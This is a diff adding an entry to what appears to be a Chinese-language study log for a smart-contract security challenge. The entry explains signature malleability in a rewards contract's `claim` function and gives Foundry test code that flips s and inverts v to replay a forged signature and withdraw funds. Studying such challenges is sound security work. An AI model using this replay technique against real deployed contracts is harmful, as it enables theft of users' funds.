@@ -1125,4 +1125,44 @@ proxychains3 forge test test/flashloan/Loan.t.sol --rpc-url $SEPOLIA_RPC_URL  -v
 
 ### 2024.09.17
 
+#### 3. Signature malleability
+
+这一关标题是签名可塑性漏洞，要求攻击者利用此漏洞提取合约中的资金
+
+给定一个有效的签名，攻击者可以做一些快速的算术来推导出一个不同的签名。然后，攻击者可以 "重放"这个修改过的签名
+
+`WhitelistedRewards`合约中有一个`whitelist`函数与`claim`函数
+`whitelist`函数要求`msg.sender`在白名单中才可以设置新的白名单用户
+`claim`函数使用`ecrecover`函数来根据给定的签名和hash来恢复签名者公钥地址，要求传入hash、r、s、v这4个参数，且要求计算出的signer在白名单中
+
+主要需要使用到`flip s`技巧
+
+``` bash
+// verify that the same signature cannot be used again
+vm.expectRevert(bytes("used"));
+rewards.claim(whitelisted, whitelistedAmount, v, r, s);
+
+// The following is math magic to invert the signature and create a valid one
+// flip s
+bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
+
+// invert v
+uint8 v2;
+require(v == 27 || v == 28, "invalid v");
+v2 = v == 27 ? 28 : 27;
+
+vm.prank(user);
+rewards.claim(user, whitelistedAmount, v2, r, s2);
+```
+
+test文件[WhitelistedRewards.t.sol](https://github.com/awmpy/warroom-ethcc-2023/blob/master/test/signature/WhitelistedRewards.t.sol)
+
+进入`warroom-ethcc-2023`目录中，执行以下命令测试：
+
+``` bash
+proxychains3 forge test test/flashloan/WhitelistedRewards.t.sol --rpc-url $SEPOLIA_RPC_URL  -vvvv
+```
+
+### 2024.09.18
+
 <!-- Content_END -->
